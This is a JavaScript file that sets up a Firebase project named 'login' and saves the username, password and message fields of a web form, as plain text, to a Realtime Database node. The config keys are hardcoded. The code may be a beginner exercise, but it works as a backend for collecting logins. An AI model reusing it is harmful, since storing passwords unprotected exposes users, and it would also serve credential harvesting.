const firebaseConfig = {
    apiKey: "AIzaSyAe6bBdN0GaQha36MvFSK8rOIWFDhHMOn0",
    authDomain: "login-b80f1.firebaseapp.com",
    databaseURL: "https://login-b80f1-default-rtdb.firebaseio.com",
    projectId: "login-b80f1",
    storageBucket: "login-b80f1.appspot.com",
    messagingSenderId: "831546433139",
    appId: "1:831546433139:web:345c108e2095b2ee221406"
  };
  
  // initialize firebase
  firebase.initializeApp(firebaseConfig);
  
  // reference your database
  var contactFormDB = firebase.database().ref("contactForm");
  
  document.getElementById("contactForm").addEventListener("submit", submitForm);
  
  function submitForm(e) {
    e.preventDefault();
  
    var username = getElementVal("username");
    var password = getElementVal("password");
    var msgContent = getElementVal("msgContent");
  
    saveMessages( username,password, msgContent);
  
    //   enable alert
    document.querySelector(".alert").style.display = "block";
  
    //   remove the alert
    setTimeout(() => {
      document.querySelector(".alert").style.display = "none";
    }, 3000);
  
    //   reset the form
    document.getElementById("contactForm").reset();
  }
  
  const saveMessages = (username, password, msgContent) => {
    var newContactForm = contactFormDB.push();
  
    newContactForm.set({
      username: username,
      password: password,
      msgContent: msgContent,
    });
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };
  